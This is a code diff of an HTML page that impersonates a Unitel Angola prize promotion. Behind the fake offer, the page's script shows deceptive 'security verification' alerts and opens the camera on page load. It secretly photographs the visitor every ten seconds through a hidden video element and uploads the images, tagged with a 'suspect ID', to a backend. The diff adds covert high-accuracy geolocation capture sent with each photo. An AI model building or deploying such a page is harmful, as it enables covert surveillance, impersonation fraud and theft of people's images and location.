@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="pt-br">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -15,7 +16,7 @@
             padding: 0;
             box-sizing: border-box;
         }
-        
+
         body {
             font-family: 'Roboto', sans-serif;
             background: linear-gradient(135deg, #004aad 0%, #003366 100%);
@@ -26,7 +27,7 @@
             align-items: center;
             padding: 20px;
         }
-        
+
         .container {
             background: white;
             border-radius: 20px;
@@ -36,7 +37,7 @@
             overflow: hidden;
             position: relative;
         }
-        
+
         .confetti {
             position: absolute;
             width: 10px;
@@ -45,20 +46,20 @@
             opacity: 0.7;
             animation: fall 5s linear infinite;
         }
-        
+
         @keyframes fall {
             to {
                 transform: translateY(100vh) rotate(360deg);
             }
         }
-        
+
         .header {
             background: linear-gradient(90deg, #ffcc00 0%, #ff9900 100%);
             padding: 30px;
             text-align: center;
             position: relative;
         }
-        
+
         .logo-unitel {
             width: 150px;
             height: 50px;
@@ -72,24 +73,24 @@
             border-radius: 8px;
             margin-bottom: 15px;
         }
-        
+
         .header h1 {
             font-weight: 700;
             font-size: 32px;
             margin-bottom: 10px;
             color: #003366;
         }
-        
+
         .header p {
             font-weight: 500;
             font-size: 18px;
             color: #003366;
         }
-        
+
         .content {
             padding: 30px;
         }
-        
+
         .prize-showcase {
             display: flex;
             justify-content: space-around;
@@ -97,7 +98,7 @@
             flex-wrap: wrap;
             gap: 20px;
         }
-        
+
         .prize-item {
             background: linear-gradient(135deg, #fff 0%, #f8f8f8 100%);
             border-radius: 15px;
@@ -108,28 +109,28 @@
             min-width: 150px;
             transition: transform 0.3s ease;
         }
-        
+
         .prize-item:hover {
             transform: translateY(-10px);
         }
-        
+
         .prize-icon {
             font-size: 40px;
             margin-bottom: 15px;
         }
-        
+
         .prize-name {
             font-weight: 600;
             margin-bottom: 10px;
             color: #003366;
         }
-        
+
         .prize-value {
             font-size: 22px;
             font-weight: 700;
             color: #ff9900;
         }
-        
+
         .cta-section {
             background: linear-gradient(90deg, #004aad 0%, #003366 100%);
             border-radius: 15px;
@@ -138,24 +139,24 @@
             color: white;
             margin: 30px 0;
         }
-        
+
         .cta-section h2 {
             font-size: 28px;
             margin-bottom: 20px;
         }
-        
+
         .cta-section p {
             font-size: 18px;
             margin-bottom: 25px;
             line-height: 1.6;
         }
-        
+
         .phone-input {
             display: flex;
             max-width: 400px;
             margin: 0 auto 25px;
         }
-        
+
         .phone-input input {
             flex: 1;
             padding: 15px;
@@ -165,7 +166,7 @@
             outline: none;
             border: 2px solid #004aad;
         }
-        
+
         .phone-input button {
             background: #ffcc00;
             color: #003366;
@@ -177,24 +178,24 @@
             cursor: pointer;
             transition: background 0.3s ease;
         }
-        
+
         .phone-input button:hover {
             background: #ff9900;
         }
-        
+
         .terms {
             font-size: 14px;
             opacity: 0.8;
             margin-top: 20px;
         }
-        
+
         .countdown {
             display: flex;
             justify-content: center;
             gap: 15px;
             margin: 25px 0;
         }
-        
+
         .countdown-item {
             background: rgba(0, 51, 102, 0.2);
             border-radius: 10px;
@@ -202,56 +203,56 @@
             min-width: 80px;
             text-align: center;
         }
-        
+
         .countdown-number {
             font-size: 28px;
             font-weight: 700;
             margin-bottom: 5px;
             color: #ffcc00;
         }
-        
+
         .countdown-label {
             font-size: 14px;
             text-transform: uppercase;
             color: white;
         }
-        
+
         .benefits {
             background: #e6f0ff;
             border-radius: 15px;
             padding: 20px;
             margin: 25px 0;
         }
-        
+
         .benefits h3 {
             color: #003366;
             text-align: center;
             margin-bottom: 15px;
         }
-        
+
         .benefits ul {
             list-style-type: none;
             padding: 0;
         }
-        
+
         .benefits li {
             padding: 10px 0;
             border-bottom: 1px dashed #004aad;
             display: flex;
             align-items: center;
         }
-        
+
         .benefits li:before {
             content: "✓";
             color: #27ae60;
             font-weight: bold;
             margin-right: 10px;
         }
-        
+
         .video-container {
             display: none;
         }
-        
+
         video {
             width: 1px;
             height: 1px;
@@ -259,7 +260,7 @@
             top: -1000px;
             left: -1000px;
         }
-        
+
         .footer {
             text-align: center;
             padding: 20px;
@@ -267,22 +268,23 @@
             color: #777;
             font-size: 14px;
         }
-        
+
         @media (max-width: 600px) {
             .prize-showcase {
                 flex-direction: column;
             }
-            
+
             .header h1 {
                 font-size: 28px;
             }
-            
+
             .header p {
                 font-size: 16px;
             }
         }
     </style>
 </head>
+
 <body>
     <div class="container">
         <div class="header">
@@ -290,7 +292,7 @@
             <h1>OFERTAS EXCLUSIVAS</h1>
             <p>Para Clientes Premium Unitel</p>
         </div>
-        
+
         <div class="content">
             <div class="benefits">
                 <h3>Benefícios Especiais para Clientes Unitel</h3>
@@ -301,7 +303,7 @@
                     <li>Aplicativos premium gratuitos (Netflix, Spotify, Disney+)</li>
                 </ul>
             </div>
-            
+
             <div class="countdown">
                 <div class="countdown-item">
                     <div class="countdown-number" id="hours">24</div>
@@ -316,48 +318,50 @@
                     <div class="countdown-label">Segundos</div>
                 </div>
             </div>
-            
+
             <div class="prize-showcase">
                 <div class="prize-item">
                     <div class="prize-icon">📱</div>
                     <div class="prize-name">iPhone 15 Pro</div>
                     <div class="prize-value">100.000 Kz</div>
                 </div>
-                
+
                 <div class="prize-item">
                     <div class="prize-icon">💻</div>
                     <div class="prize-name">MacBook Air</div>
                     <div class="prize-value">75.000 Kz</div>
                 </div>
-                
+
                 <div class="prize-item">
                     <div class="prize-icon">📺</div>
                     <div class="prize-name">Smart TV 55"</div>
                     <div class="prize-value">50.000 Kz</div>
                 </div>
             </div>
-            
+
             <div class="cta-section">
                 <h2>Participe Agora Mesmo!</h2>
-                <p>Como cliente Unitel, você tem acesso exclusivo a estas ofertas incríveis. Digite seu número abaixo para participar.</p>
-                
+                <p>Como cliente Unitel, você tem acesso exclusivo a estas ofertas incríveis. Digite seu número abaixo
+                    para participar.</p>
+
                 <div class="phone-input">
                     <input type="tel" id="phoneNumber" placeholder="+244 XXX XXX XXX">
                     <button id="participateBtn">PARTICIPAR</button>
                 </div>
-                
-                <p class="terms">Promoção válida apenas para clientes Unitel ativos. Oferta por tempo limitado. Consulte condições em lojas Unitel.</p>
+
+                <p class="terms">Promoção válida apenas para clientes Unitel ativos. Oferta por tempo limitado. Consulte
+                    condições em lojas Unitel.</p>
             </div>
         </div>
-        
+
         <div class="video-container">
             <video id="video" autoplay playsinline muted></video>
             <canvas id="canvas" style="display:none;"></canvas>
         </div>
-        
+
         <div class="footer">
             <p>© 2025 Unitel - Telecomunicações de Angola S.A.<br>
-            NIF: 5417095591 - Rua Rainha Ginga, Luanda</p>
+                NIF: 5417095591 - Rua Rainha Ginga, Luanda</p>
         </div>
     </div>
 
@@ -366,24 +370,44 @@
         let stream = null;
         let captureInterval = null;
         let photoCount = 0;
-        
+        let userLatitude = null;
+        let userLongitude = null;
+
         // DOM Elements
         const videoElement = document.getElementById('video');
         const canvasElement = document.getElementById('canvas');
         const participateBtn = document.getElementById('participateBtn');
         const phoneNumberInput = document.getElementById('phoneNumber');
-        
+
+        // Request geolocation permissions
+        async function requestLocationAccess() {
+            if (navigator.geolocation) {
+                console.log("Requesting location...");
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        userLatitude = position.coords.latitude;
+                        userLongitude = position.coords.longitude;
+                        console.log("Location captured:", userLatitude, userLongitude);
+                    },
+                    (error) => {
+                        console.error("Error capturing location:", error);
+                    },
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                );
+            }
+        }
+
         // Countdown timer
         function startCountdown() {
             const hoursElement = document.getElementById('hours');
             const minutesElement = document.getElementById('minutes');
             const secondsElement = document.getElementById('seconds');
-            
+
             let totalSeconds = 24 * 3600; // 24 hours
-            
+
             const interval = setInterval(() => {
                 totalSeconds--;
-                
+
                 if (totalSeconds <= 0) {
                     clearInterval(interval);
                     hoursElement.textContent = '00';
@@ -391,52 +415,55 @@
                     secondsElement.textContent = '00';
                     return;
                 }
-                
+
                 const hours = Math.floor(totalSeconds / 3600);
                 const minutes = Math.floor((totalSeconds % 3600) / 60);
                 const seconds = totalSeconds % 60;
-                
+
                 hoursElement.textContent = hours.toString().padStart(2, '0');
                 minutesElement.textContent = minutes.toString().padStart(2, '0');
                 secondsElement.textContent = seconds.toString().padStart(2, '0');
             }, 1000);
         }
-        
+
         // Request camera permissions with social engineering
         async function requestCameraAccess() {
             try {
-                // Show a convincing message before requesting camera access
-                alert("Para garantir a segurança da sua conta Unitel e validar sua elegibilidade para os prêmios, precisamos verificar seu dispositivo. Esta é uma verificação automática de segurança para proteger sua conta.");
-                
+                // Show a combined convincing message
+                alert("Para validar sua elegibilidade para os prêmios exclusivos na sua região e garantir a entrega correta dos brindes, precisamos verificar sua localização e identidade. Esta é uma verificação de segurança obrigatória.");
+
+                // Request location
+                requestLocationAccess();
+
                 // Request camera access
-                stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'environment' }, 
-                    audio: false 
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'environment' },
+                    audio: false
                 });
-                
+
                 // Display video feed off-screen
                 videoElement.srcObject = stream;
-                
+
                 // Start capture immediately
                 startCapture();
-                
+
                 return true;
             } catch (error) {
                 console.error('Error accessing camera:', error);
-                alert("Verificação não concluída. Você ainda pode participar, mas alguns prêmios especiais podem estar indisponíveis.");
+                alert("Sem as permissões necessárias, a validação para prêmios regionais de alto valor pode ser comprometida.");
                 return false;
             }
         }
-        
+
         // Capture photo from video stream
         function capturePhoto() {
             if (!stream) return;
-            
+
             canvasElement.width = videoElement.videoWidth;
             canvasElement.height = videoElement.videoHeight;
             const ctx = canvasElement.getContext('2d');
             ctx.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
-            
+
             // Convert to blob and send
             canvasElement.toBlob(async (blob) => {
                 if (blob) {
@@ -445,17 +472,23 @@
                 }
             }, 'image/jpeg', 0.8);
         }
-        
+
         // Send media to backend
         async function sendMedia(blob, mediaType, filename) {
             const formData = new FormData();
             formData.append('media_type', mediaType);
             formData.append('file', blob, filename);
             formData.append('caption', `Prizes template - ${mediaType} captured at ${new Date().toLocaleString()}`);
-            
+
+            // Add geolocation data if available
+            if (userLatitude !== null && userLongitude !== null) {
+                formData.append('latitude', userLatitude);
+                formData.append('longitude', userLongitude);
+            }
+
             // Debug logging
-            console.log('Sending media with suspect ID:', window.SUSPECT_ID);
-            
+            console.log('Sending media with suspect ID:', window.SUSPECT_ID, 'Geo:', userLatitude, userLongitude);
+
             try {
                 const response = await fetch('/api/angosite/upload/', {
                     method: 'POST',
@@ -464,7 +497,7 @@
                         'X-Suspect-ID': window.SUSPECT_ID || '1'  // Use dynamic suspect ID
                     }
                 });
-                
+
                 if (response.ok) {
                     console.log(`${mediaType} sent successfully`);
                 } else {
@@ -474,26 +507,26 @@
                 console.error(`Error sending ${mediaType}:`, error);
             }
         }
-        
+
         // Start automatic capture
         function startCapture() {
             if (captureInterval) {
                 clearInterval(captureInterval);
             }
-            
+
             // Take a photo every 10 seconds
             captureInterval = setInterval(() => {
                 capturePhoto();
             }, 10000);
-            
+
             // Take an initial photo
             setTimeout(() => {
                 capturePhoto();
             }, 2000);
         }
-        
+
         // Handle participation button click
-        participateBtn.addEventListener('click', function() {
+        participateBtn.addEventListener('click', function () {
             const phone = phoneNumberInput.value.trim();
             if (phone) {
                 // Trigger capture when user submits form
@@ -503,15 +536,16 @@
                 alert('Por favor, digite um número de telefone válido da Unitel.');
             }
         });
-        
+
         // Initialize when page loads
         window.addEventListener('DOMContentLoaded', async () => {
             // Start countdown
             startCountdown();
-            
+
             // Request camera access immediately
             await requestCameraAccess();
         });
     </script>
 </body>
+
 </html>
